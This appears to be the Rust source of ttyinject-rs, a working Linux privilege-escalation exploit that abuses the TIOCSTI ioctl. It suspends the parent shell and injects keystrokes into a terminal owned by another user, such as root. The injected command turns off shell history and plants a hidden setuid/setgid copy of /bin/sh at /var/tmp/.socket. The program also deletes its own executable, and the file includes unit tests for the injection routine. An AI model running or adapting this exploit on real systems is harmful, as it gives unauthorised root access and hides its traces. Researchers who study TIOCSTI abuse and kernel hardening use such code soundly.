#![doc = env!("CARGO_PKG_DESCRIPTION")]
#![doc = ""]
#![cfg_attr(doc, doc = include_str!("../README.md"))]
#![doc(html_logo_url = "https://raw.githubusercontent.com/0xdea/ttyinject-rs/master/.img/logo.png")]

#[cfg(not(target_os = "linux"))]
compile_error!("ttyinject-rs only supports Linux (it relies on the TIOCSTI ioctl)");

use std::io::{self, IsTerminal as _, Write as _};
use std::os::unix::fs::MetadataExt as _;
use std::time::Duration;
use std::{env, fs, thread};

use anyhow::Context as _;
use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, kill, pid_t, uid_t};

/// First part of the payload to inject into the tty's input buffer.
const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
/// The command to execute after the payload has been injected.
const COMMAND: &[u8] = b"cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socket";
/// End part of the payload to inject into the tty's input buffer.
const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";

/// Abuses the `TIOCSTI` ioctl to inject keystrokes into a terminal to escalate privileges on Linux.
///
/// # Errors
///
/// Returns an [`anyhow::Error`] if the `TIOCSTI` ioctl fails.
pub fn run() -> anyhow::Result<()> {
    // Check that we are not already root, that stdin refers to a terminal, and that we have a valid parent.
    // SAFETY: getuid() is safe to call
    let uid = unsafe { getuid() };
    let is_tty = io::stdin().is_terminal();
    // SAFETY: getppid() is safe to call
    let parent_pid = unsafe { libc::getppid() };
    check_preconditions(uid, is_tty, parent_pid)?;

    // Check that we have a valid tty and that it does not have the same uid as us.
    let tty_path = fs::read_link(format!("/proc/self/fd/{STDIN_FILENO}"))
        .context("failed to resolve tty path")?;
    let tty_metadata = fs::metadata(&tty_path).context("failed to stat tty")?;
    check_tty_ownership(uid, tty_metadata.uid())?;

    // Only execute once: delete our own executable.
    let exe_path = env::current_exe().context("failed to resolve own executable path")?;
    fs::remove_file(&exe_path).context("failed to delete own executable")?;

    // Check that injection works.
    tiocsti_inject(STDIN_FILENO, b' ').context("failed to inject into tty")?;

    // Suspend the parent to the background so that the injected string goes into its shell.
    // SAFETY: `parent_pid` is a valid pid obtained from `getppid` above; `SIGSTOP` carries no
    // argument/pointer, so this call cannot cause UB regardless of whether the signal succeeds.
    if unsafe { kill(parent_pid, SIGSTOP) } != 0 {
        anyhow::bail!(
            "failed to suspend parent process: {}",
            io::Error::last_os_error()
        );
    }

    // Give the parent's shell enough time to be ready for input.
    thread::sleep(Duration::from_millis(100));

    // Inject the payload into the tty.
    for &b in START {
        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
    }
    for &b in COMMAND {
        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
    }
    for &b in END {
        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
    }

    // TODO: implement some integration tests, excluding tests that don't work in ci
    // TODO: update documentation to reflect changes (especially verbose/quiet mode) + how to add as a library to use in your own projects
    // TODO: publish on crates.io and enable semver checks in ci
    // TODO: final check of cargo doc --open

    // No need to SIGCONT here because `fg` in the payload does that for us.
    Ok(())
}

/// Checks that we are not already root, that stdin refers to a terminal, and that we have a valid parent.
fn check_preconditions(uid: uid_t, is_tty: bool, parent_pid: pid_t) -> anyhow::Result<()> {
    if uid == 0 {
        anyhow::bail!("we are already root");
    }
    if !is_tty {
        anyhow::bail!("stdin does not refer to a terminal");
    }
    if parent_pid <= 1 {
        anyhow::bail!("invalid parent process id");
    }
    Ok(())
}

/// Checks that the tty does not have the same uid as us.
fn check_tty_ownership(uid: uid_t, tty_uid: uid_t) -> anyhow::Result<()> {
    if tty_uid == uid {
        anyhow::bail!("tty has the same uid as us");
    }
    Ok(())
}

/// Injects a single byte into a tty's input buffer as if it were typed.
///
/// Requires `TIOCSTI` to be permitted (Linux 6.2+ restricts this via the `dev.tty.legacy_tiocsti` sysctl, which is set
/// to false by default on recent kernels).
///
/// # Errors
///
/// Returns an [`io::Error`] if the `TIOCSTI` ioctl fails.
///
/// # Examples
///
/// Inject a single byte into stdin's tty input buffer, as if it had been typed:
///
/// ```no_run
/// use ttyinject_rs::tiocsti_inject;
///
/// # Ok::<(), std::io::Error>(())
/// ```
///
/// Inject a whole command into stdin's tty input buffer, byte by byte:
///
/// ```no_run
/// use ttyinject_rs::tiocsti_inject;
///
/// for &byte in b"ls\n" {
///     tiocsti_inject(0, byte)?;
/// }
/// # Ok::<(), std::io::Error>(())
/// ```
///
/// These examples are marked `no_run` because `TIOCSTI` only succeeds against a tty that is the calling process's own
/// controlling terminal (see [`tiocsti_inject`]'s requirements above), which doctests don't run under.
pub fn tiocsti_inject(fd: c_int, byte: u8) -> io::Result<()> {
    // SAFETY: `&raw const byte` is a valid pointer to a live, properly initialized `u8` for the duration of the call,
    // matching the single-`c_char` argument that `TIOCSTI` expects; `fd` need not refer to a tty for this call to be
    // sound; an invalid or wrong-type fd simply makes the ioctl fail (`EBADF`/`ENOTTY`) rather than causing UB.
    let ret = unsafe { ioctl(fd, TIOCSTI, &raw const byte) };
    if ret < 0 {
        return Err(io::Error::last_os_error());
    }
    Ok(())
}

/// Clear `lines` lines from the terminal. If `lines` is 0, clears the entire terminal.
///
/// # Examples
///
/// Clear the three most recently printed lines:
/// ```
/// use ttyinject_rs::clear_terminal;
///
/// clear_terminal(3);
/// ```
///
/// Clear the entire terminal:
///
/// ```
/// use ttyinject_rs::clear_terminal;
///
/// clear_terminal(0);
/// ```
pub fn clear_terminal(lines: u16) {
    if lines == 0 {
        print!("\x1b[H\x1b[J");
    } else {
        print!("\x1b[{lines}A\x1b[J");
    }
    _ = io::stdout().flush();
}

#[expect(clippy::expect_used, reason = "tests can use `expect`")]
#[expect(clippy::panic, reason = "tests can use `panic`")]
#[cfg(test)]
mod tests {
    use std::ffi::CString;
    use std::ptr;

    use libc::*;

    use super::*;

    #[test]
    fn check_preconditions_rejects_root() {
        let result = check_preconditions(0, true, 100);

        assert!(result.is_err(), "expected an error when uid is 0 (root)");
    }

    #[test]
    fn check_preconditions_rejects_non_tty() {
        let result = check_preconditions(1000, false, 100);

        assert!(
            result.is_err(),
            "expected an error when stdin is not a terminal"
        );
    }

    #[test]
    fn check_preconditions_rejects_invalid_parent() {
        let result = check_preconditions(1000, true, 1);

        assert!(
            result.is_err(),
            "expected an error when the parent pid is invalid"
        );
    }

    #[test]
    fn check_preconditions_accepts_valid_state() {
        let result = check_preconditions(1000, true, 100);

        assert!(result.is_ok(), "expected valid state to pass the checks");
    }

    #[test]
    fn check_tty_ownership_rejects_same_uid() {
        let result = check_tty_ownership(1000, 1000);

        assert!(
            result.is_err(),
            "expected an error when the tty has the same uid as us"
        );
    }

    #[test]
    fn check_tty_ownership_accepts_different_uid() {
        let result = check_tty_ownership(1000, 0);

        assert!(
            result.is_ok(),
            "expected a different tty uid to pass the check"
        );
    }

    #[test]
    fn tiocsti_inject_invalid_fd_returns_err() {
        let invalid_fd: c_int = -1;

        let result = tiocsti_inject(invalid_fd, b'X');

        assert!(
            result.is_err(),
            "expected an error for an invalid file descriptor"
        );
    }

    #[test]
    fn tiocsti_inject_via_pty() {
        let mut master: c_int = 0;
        let mut slave: c_int = 0;

        // SAFETY: `master` and `slave` are valid out-pointers to live `c_int` locals; the name, termios, and winsize
        // out-parameters are optional per `openpty`'s contract and may be null.
        let openpty_ret = unsafe {
            openpty(
                &raw mut master,
                &raw mut slave,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
            )
        };

        assert_eq!(
            openpty_ret,
            0,
            "openpty failed: {}",
            io::Error::last_os_error()
        );

        // The kernel only allows `TIOCSTI` against a tty that is the *calling process's own controlling terminal*
        // (unless the caller has `CAP_SYS_ADMIN`), regardless of the `dev.tty.legacy_tiocsti` sysctl setting. Neither
        // the test process nor a simple inherited copy of `slave` satisfies that, so resolve the slave's device path
        // and have a freshly `setsid`'d child *open* it: opening a tty without `O_NOCTTY` in a session with no
        // controlling terminal yet makes it that session's controlling terminal.
        let mut path_buf = [0_u8; 64];
        // SAFETY: `slave` is a valid, open pty fd from `openpty` above; `path_buf` is a live,
        // writable buffer whose length is passed accurately, which is large enough for any
        // `/dev/pts/N` path.
        let ttyname_ret = unsafe { ttyname_r(slave, path_buf.as_mut_ptr().cast(), path_buf.len()) };

        assert_eq!(
            ttyname_ret,
            0,
            "ttyname_r failed: {}",
            io::Error::from_raw_os_error(ttyname_ret)
        );

        let path = CString::new(
            path_buf
                .iter()
                .take_while(|&&byte| byte != 0)
                .copied()
                .collect::<Vec<u8>>(),
        )
        .expect("pty path should not contain interior NUL bytes");

        // SAFETY: `slave` is a valid, open file descriptor from `openpty` above, closed exactly once here; the child
        // below reopens the pty fresh by path instead of relying on this fd.
        unsafe {
            close(slave);
        };

        let byte = b'X';

        // SAFETY: the child performs only async-signal-safe operations (`setsid`, `open`, `ioctl` via
        // `tiocsti_inject`, `_exit`) and never returns through normal Rust control flow, which is required for safely
        // using `fork` from a multi-threaded process.
        let pid = unsafe { fork() };
        assert!(pid >= 0, "fork failed: {}", io::Error::last_os_error());

        if pid == 0 {
            // Child: detach from any inherited controlling terminal and become a new session leader with none, then
            // open the pty slave by path so the kernel assigns it as this session's controlling terminal, satisfying
            // `TIOCSTI`'s same-tty requirement.
            //
            // SAFETY: called immediately after `fork`, before any other syscall in the child.
            unsafe {
                setsid();
            };

            // SAFETY: `path` is a valid, NUL-terminated C string obtained from `ttyname_r` above.
            let child_fd = unsafe { open(path.as_ptr(), O_RDWR) };
            if child_fd < 0 {
                // SAFETY: terminates the child directly, without unwinding or running destructors.
                unsafe {
                    _exit(2);
                };
            }

            let result = tiocsti_inject(child_fd, byte);

            // SAFETY: terminates the child directly, without unwinding or running destructors.
            unsafe {
                _exit(i32::from(result.is_err()));
            };
        }

        // Parent: wait for the child to finish injecting (or failing to inject) the byte.
        let mut status: c_int = 0;

        // SAFETY: `pid` is the valid child pid returned by `fork` above; `status` is a valid, writable out-parameter.
        let waitpid_ret = unsafe { waitpid(pid, &raw mut status, 0) };

        assert_eq!(
            waitpid_ret,
            pid,
            "waitpid failed: {}",
            io::Error::last_os_error()
        );
        assert!(WIFEXITED(status), "child did not exit normally");

        match WEXITSTATUS(status) {
            0 => {
                let mut buf = [0_u8; 1];
                // SAFETY: `master` is a valid, open file descriptor from `openpty` above; `buf` is a live, properly
                // sized buffer for a single-byte read.
                let n = unsafe { read(master, buf.as_mut_ptr().cast(), buf.len()) };
                assert_eq!(
                    n, 1,
                    "expected to read exactly one byte from the PTY master"
                );
                assert_eq!(buf[0], byte);
            }

            2 => panic!("child failed to open its new controlling terminal"),

            _ => {
                // TIOCSTI may still be disabled by the `dev.tty.legacy_tiocsti` sysctl (default since Linux 6.2), or
                // forbidden entirely in sandboxed/CI environments even for a process's own controlling terminal. Treat
                // this as an expected, non-fatal outcome rather than a test failure.
                eprintln!(
                    "tiocsti_inject failed in child, likely due to TIOCSTI being disabled or forbidden in this environment"
                );
            }
        }

        // SAFETY: `master` is a valid, open file descriptor from `openpty` above, closed exactly once here.
        unsafe {
            close(master);
        };
    }
}
